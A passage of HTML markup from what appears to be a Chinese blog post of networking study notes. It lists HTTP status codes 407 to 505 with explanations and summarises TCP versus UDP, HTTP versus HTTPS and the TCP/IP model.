请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</span><br><span class="line">408	Request Time-out	服务器等待客户端发送的请求时间过长，超时</span><br><span class="line">409	Conflict	服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突</span><br><span class="line">410	Gone	客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</span><br><span class="line">411	Length Required	服务器无法处理客户端发送的不带Content-Length的请求信息</span><br><span class="line">412	Precondition Failed	客户端请求信息的先决条件错误</span><br><span class="line">413	Request Entity Too Large	由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</span><br><span class="line">414	Request-URI Too Large	请求的URI过长（URI通常为网址），服务器无法处理</span><br><span class="line">415	Unsupported Media Type	服务器无法处理请求附带的媒体格式</span><br><span class="line">416	Requested range not satisfiable	客户端请求的范围无效</span><br><span class="line">417	Expectation Failed	服务器无法满足Expect的请求头信息</span><br><span class="line">500	Internal Server Error	服务器内部错误，无法完成请求</span><br><span class="line">501	Not Implemented	服务器不支持请求的功能，无法完成请求</span><br><span class="line">502	Bad Gateway	充当网关或代理的服务器，从远端服务器接收到了一个无效的请求</span><br><span class="line">503	Service Unavailable	由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</span><br><span class="line">504	Gateway Time-out	充当网关或代理的服务器，未及时从远端服务器获取请求</span><br><span class="line">505	HTTP Version not supported	服务器不支持请求的HTTP协议的版本，无法完成处理</span><br></pre></td></tr></table></figure>
-<p>tcp知识：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.tcp的三次握手，四次挥手</span><br><span class="line">2.tcp的可靠性实现机制</span><br><span class="line">  分片重组，超时重传，有错丢弃，滑动窗口，检验和认证</span><br><span class="line">3.TCP：全双工，面向连接的，可靠的，基于字节流的;</span><br><span class="line">  UDP：无连接的，面向报文的，尽最大努力交付;</span><br><span class="line">4.各协议首部长度:IP:20字节     TCP:20字节      UDP:8字节</span><br><span class="line">5.http与https的区别：</span><br><span class="line">  a:url不同；b:http采用80端口，https采用443端口；</span><br><span class="line">  C：https协议需要到ca申请证书，一般免费证书很少，需要交费。</span><br><span class="line">  d:http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</span><br><span class="line">  e:http是超文本传输协议，信息是明文传输，https 则是具有安全性的ssl加密传输协议。</span><br></pre></td></tr></table></figure>
-<p>TCP/IP协议</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.7层/5层模型的每层代表协议</span><br><span class="line">2.TCP/IP体系，和HTTP的关系</span><br><span class="line">  TCP/IP 是网络核心层，HTTP是基于网络应用层协议。</span><br><span class="line">  HTTP支持客户端/服务器模式；简单、灵活；无连接、无状态；无连接是指每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。无状态是指协议对事务处理的没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可以导致每次连接传送的数据量增大。在服务器不需要先前信息时它的应答就较快。</span><br></pre></td></tr></table></figure>
-<hr>
-<p><strong>谢谢浏览！！！</strong></p>
-<hr>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/web-security/">web security</a>
     </span>
     
 
